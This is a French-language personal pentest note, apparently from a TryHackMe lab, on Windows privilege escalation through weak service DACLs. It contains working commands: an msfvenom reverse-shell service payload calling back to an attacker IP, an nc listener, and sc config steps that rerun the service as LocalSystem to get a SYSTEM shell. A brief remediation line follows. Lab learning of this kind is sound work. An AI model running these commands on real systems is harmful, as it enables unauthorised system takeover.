---
technique: "Weak Service Permissions (DACL)"
os: Windows
categorie: PrivEsc
tags: [technique, privesc, windows, services]
rooms: []
---

# Weak Service Permissions (DACL du service)

## Principe
> Même si l'exe est bien protégé et le chemin quoté, la **DACL du service** peut autoriser un user à le **reconfigurer** (`SERVICE_CHANGE_CONFIG` / `SERVICE_ALL_ACCESS`). On change alors l'exécutable **et** le compte → on choisit `LocalSystem` → shell SYSTEM. C'est la faille la plus puissante des trois.

## Détection
```cmd
C:\tools\AccessChk\accesschk64.exe -qlc <service>
:: chercher BUILTIN\Users : SERVICE_ALL_ACCESS
```

## Exploitation
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=MON_IP LPORT=4447 -f exe-service -o rev-svc3.exe
nc -lvp 4447
```
```cmd
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
:: Reconfigurer le service (ATTENTION aux espaces après les =)
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
sc stop THMService
sc start THMService
```
→ `whoami` = **NT AUTHORITY\SYSTEM**.

## Pièges vécus
- Bien mettre **un espace après `binPath=` et `obj=`**.
- `sc stop` peut renvoyer **FAILED 1062 "service has not been started"** → ce n'est pas bloquant, le service était juste déjà arrêté, on enchaîne `sc start`.

## Les 3 failles de service en résumé
| Faille | Ce que je modifie |
|--------|-------------------|
| Service-Insecure-Permissions | l'**exe** du service |
| Unquoted-Service-Path | un **dossier** du chemin |
| Weak DACL (ici) | la **config** du service |

## Remédiation
- DACL stricte : seuls les admins peuvent reconfigurer un service.
